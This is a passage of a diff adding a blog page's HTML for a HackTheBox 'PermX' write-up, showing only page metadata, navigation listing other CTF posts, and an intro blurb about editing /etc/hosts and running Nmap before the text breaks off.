@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+<link rel="icon" href="/favicon-dark.svg" type="image/svg+xml" media="(prefers-color-scheme: dark)" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>PermX - HackTheBox Write-Up – PrintN</title>
+  <meta name="description" content="
+Introduction Hello👋 Today we’re going to take a look at PermX machine on HackTheBox by …" /><link rel="canonical" href="http://localhost:1313/blog/permx-hackthebox/" itemprop="url" />
+
+<meta property="og:title" content="PrintN" />
+<meta property="og:description" content="
+Introduction
+    Hello👋 Today we&rsquo;re going to take a look at PermX machine on HackTheBox by mtzsec. The difficulty is easy.
+We&rsquo;ll have to start by adding the target IP Adress to our /etc/hosts use nano or vim to edit this.
+
+
+[YOUR_TARGET_IP] permx.htb
+  
+    
+    
+  
+
+
+Enumeration
+    We&rsquo;ll start by scanning for open ports with Nmap.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/blog/permx-hackthebox/" /><meta property="og:image" content="http://localhost:1313/images/og_image.png"/><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2024-09-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-09-28T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://beginnerprivacy.com/images/og_image.png">
+<meta name="twitter:title" content="PrintN">
+<meta name="twitter:description" content="
+Introduction
+    Hello👋 Today we&rsquo;re going to take a look at PermX machine on HackTheBox by mtzsec. The difficulty is easy.
+We&rsquo;ll have to start by adding the target IP Adress to our /etc/hosts use nano or vim to edit this.
+
+
+[YOUR_TARGET_IP] permx.htb
+  
+    
+    
+  
+
+
+Enumeration
+    We&rsquo;ll start by scanning for open ports with Nmap.
+">
+
+  <meta itemprop="name" content="PermX - HackTheBox Write-Up">
+  <meta itemprop="description" content="Introduction Hello👋 Today we’re going to take a look at PermX machine on HackTheBox by mtzsec. The difficulty is easy.
+We’ll have to start by adding the target IP Adress to our /etc/hosts use nano or vim to edit this.
+[YOUR_TARGET_IP] permx.htb Enumeration We’ll start by scanning for open ports with Nmap.">
+  <meta itemprop="datePublished" content="2024-09-28T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-09-28T00:00:00+00:00">
+  <meta itemprop="wordCount" content="471">
+  <meta itemprop="image" content="http://localhost:1313/images/og_image.png">
+    <link href="/css/compiled/main.css" rel="stylesheet" />
+
+
+
+  <link href="/css/custom.css" rel="stylesheet" />
+  <link href="/css/components/custom/footer.css" rel="stylesheet" />
+
+  <script>
+     
+    const defaultTheme = 'system';
+
+    const setDarkTheme = () => {
+      document.documentElement.classList.add("dark");
+      document.documentElement.style.colorScheme = "dark";
+    }
+    const setLightTheme = () => {
+      document.documentElement.classList.remove("dark");
+      document.documentElement.style.colorScheme = "light";
+    }
+
+    if ("color-theme" in localStorage) {
+      localStorage.getItem("color-theme") === "dark" ? setDarkTheme() : setLightTheme();
+    } else {
+      defaultTheme === "dark" ? setDarkTheme() : setLightTheme();
+      if (defaultTheme === "system") {
+        window.matchMedia("(prefers-color-scheme: dark)").matches ? setDarkTheme() : setLightTheme();
+      }
+    }
+  </script>
+
+  
+    <script type="application/ld+json">
+      {
+          "@context": "https://printn.dev",
+          "@type": "Article",
+          "name": "PermX - HackTheBox Write-Up",
+          "url": "http:\/\/localhost:1313\/blog\/permx-hackthebox\/",
+          "logo": "https://printn.dev/images/logo.svg",
+          "sameAs": [
+              "https://github.com/BeginnerPrivacy",
+              "https://leetcode.com/PrintN",
+              "https://tryhackme.com/p/PrintN"
+          ]
+      }
+    </script>
+  
+
+  
+</head>
+<body dir="ltr"><div class="nav-container hx-sticky hx-top-0 hx-z-20 hx-w-full hx-bg-transparent print:hx-hidden">
+  <div class="nav-container-blur hx-pointer-events-none hx-absolute hx-z-[-1] hx-h-full hx-w-full hx-bg-white dark:hx-bg-dark hx-shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] contrast-more:hx-shadow-[0_0_0_1px_#000] dark:hx-shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] contrast-more:dark:hx-shadow-[0_0_0_1px_#fff]"></div>
+
+  <nav class="hx-mx-auto hx-pt-3 hx-flex hx-items-center hx-justify-end hx-gap-2 hx-h-16 hx-max-w-[94vw]">
+    <a class="hx-flex hx-items-center hover:hx-opacity-75 ltr:hx-mr-auto rtl:hx-ml-auto" href="/">
+      <div class="printn-container">
+        <span class="printn-text hx-text-2xl hx-font-bold hx-inline hx-select-none"></span>
+      </div>
+    </a><div class="language-theme-container hx-mb-5px"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-rounded-md hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-text-gray-900 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=30 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=30 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg></div>
+</button>
+</div>
+  </nav>
+</div>
+
+  <div class="hx-mx-auto hx-flex hx-max-w-screen-xl">
+    <div class="mobile-menu-overlay [transition:background-color_1.5s_ease] hx-fixed hx-inset-0 hx-z-10 hx-bg-black/80 dark:hx-bg-black/60 hx-hidden"></div>
+<aside class="sidebar-container hx-flex hx-flex-col print:hx-hidden md:hx-top-16 md:hx-shrink-0 md:hx-w-64 md:hx-self-start max-md:[transform:translate3d(0,-100%,0)] md:hx-hidden xl:hx-block">
+  
+  <div class="hx-px-4 hx-pt-4 md:hx-hidden">
+    <div class="search-wrapper hx-relative md:hx-w-64">
+  <div class="hx-relative hx-flex hx-items-center hx-text-gray-900 contrast-more:hx-text-gray-800 dark:hx-text-gray-300 contrast-more:dark:hx-text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx-block hx-w-full hx-appearance-none hx-rounded-lg hx-px-3 hx-py-2 hx-transition-colors hx-text-base hx-leading-tight md:hx-text-sm hx-bg-black/[.05] dark:hx-bg-gray-50/10 focus:hx-bg-white dark:focus:hx-bg-dark placeholder:hx-text-gray-500 dark:placeholder:hx-text-gray-400 contrast-more:hx-border contrast-more:hx-border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx-absolute hx-my-1.5 hx-select-none ltr:hx-right-1.5 rtl:hx-left-1.5 hx-h-5 hx-rounded hx-bg-white hx-px-1.5 hx-font-mono hx-text-[10px] hx-font-medium hx-text-gray-500 hx-border dark:hx-border-gray-100/20 dark:hx-bg-dark/50 contrast-more:hx-border-current contrast-more:hx-text-current contrast-more:dark:hx-border-current hx-items-center hx-gap-1 hx-transition-opacity hx-pointer-events-none hx-hidden sm:hx-flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx-hidden hx-border hx-border-gray-200 hx-bg-white hx-text-gray-100 dark:hx-border-neutral-800 dark:hx-bg-neutral-900 hx-absolute hx-top-full hx-z-20 hx-mt-2 hx-overflow-auto hx-overscroll-contain hx-rounded-xl hx-py-2.5 hx-shadow-xl hx-max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:hx-max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx-inset-x-0 ltr:md:hx-left-auto rtl:md:hx-right-auto contrast-more:hx-border contrast-more:hx-border-gray-900 contrast-more:dark:hx-border-gray-50 hx-w-screen hx-min-h-[100px] hx-max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx-overflow-y-auto hx-overflow-x-hidden hx-p-4 hx-grow md:hx-h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx-flex hx-flex-col hx-gap-1 md:hx-hidden">
+      
+      
+          <li class="open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/"
+    
+  >Blog
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/factcheck-picoctf/"
+    
+  >FactCheck - PicoCTF Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/understand-your-threat-model/"
+    
+  >Understand Your Threat Model
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/why-you-should-start-using-rss-feed/"
+    
+  >Why You Should Set Up an RSS Feed
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/step-by-step-guide-for-publishing-your-open-source-app-on-f-droid/"
+    
+  >Step-by-Step Guide for Publishing Your Open Source App on F-Droid
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/collaborative-development-picoctf/"
+    
+  >Collaborative Development - PicoCTF Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/lesson-learned-tryhackme/"
+    
+  >Lesson Learned? - TryHackMe Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/how-to-calculate-time-complexity/"
+    
+  >How To Calculate Time Complexity
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/redaction-gone-wrong-picoctf/"
+    
+  >Redaction gone wrong - PicoCTF Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/10-essential-nmap-flags/"
+    
+  >10 Essential Nmap Flags
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/unpackme-picoctf/"
+    
+  >unpackme - PicoCTF Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/plumbing-picoctf/"
+    
+  >Plumbing - PicoCTF Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/blame-game-picoctf/"
+    
+  >Blame Game - PicoCTF Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item hx-bg-primary-100 hx-font-semibold hx-text-primary-800 contrast-more:hx-border contrast-more:hx-border-primary-500 dark:hx-bg-primary-400/10 dark:hx-text-primary-600 contrast-more:dark:hx-border-primary-500"
+    href="/blog/permx-hackthebox/"
+    
+  >PermX - HackTheBox Write-Up
+    </a>
+  
+    <ul class='hx-flex hx-flex-col hx-gap-1 hx-relative before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] dark:before:hx-bg-neutral-800 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-pr-3 rtl:before:hx-right-0 ltr:hx-ml-3 rtl:hx-mr-3'><li>
+              <a
+                href="#"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              ></a>
+            </li>
+          </ul>
+  
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/creative-tryhackme/"
+    
+  >Creative - TryHackMe Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/w1seguy-tryhackme/"
+    
+  >W1seGuy - TryHackMe Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/good_boy-crackmes/"
+    
+  >good_boy - Crackmes Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/easy_reverse-crackmes/"
+    
+  >easy_reverse - Crackmes Write-Up
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/blog/my-first-blog-post/"
+    
+  >My First Blog Post 🥳
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/donate/"
+    
+  >Donate
+    </a></li><a class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+        hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50" href="https://shop.beginnerprivacy.com">Shop</a>
+      
+    </ul>
+
+    <div class="max-xl:hx-hidden hx-h-0 hx-w-64 hx-shrink-0"></div></div>
+  
+  <div class="language-theme-sidebar-container">
+  
+    <div class="md:hx-hidden  hx-sticky hx-bottom-0 hx-bg-white dark:hx-bg-dark hx-mx-4 hx-py-4 hx-shadow-[0_-12px_16px_#fff] hx-flex hx-items-center hx-gap-2 dark:hx-border-neutral-800 dark:hx-shadow-[0_-12px_16px_#111] contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-shadow-none hx-border-t" data-toggle-animation="show"><div class="hx-flex hx-grow hx-flex-col"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-rounded-md hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-text-gray-900 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=30 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=30 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg></div>
+</button>
+</div></div></div>
+</aside>
+    
+<nav class="hextra-toc hx-order-last hx-hidden hx-w-64 hx-shrink-0 xl:hx-block print:hx-hidden hx-px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx-sticky hx-top-16 hx-overflow-y-auto hx-pr-4 hx-pt-6 hx-text-sm [hyphens:auto] hx-max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] ltr:hx--mr-4 rtl:hx--ml-4"><p class="hx-mb-4 hx-font-semibold hx-tracking-tight">On this page</p><ul>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#introduction">Introduction
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
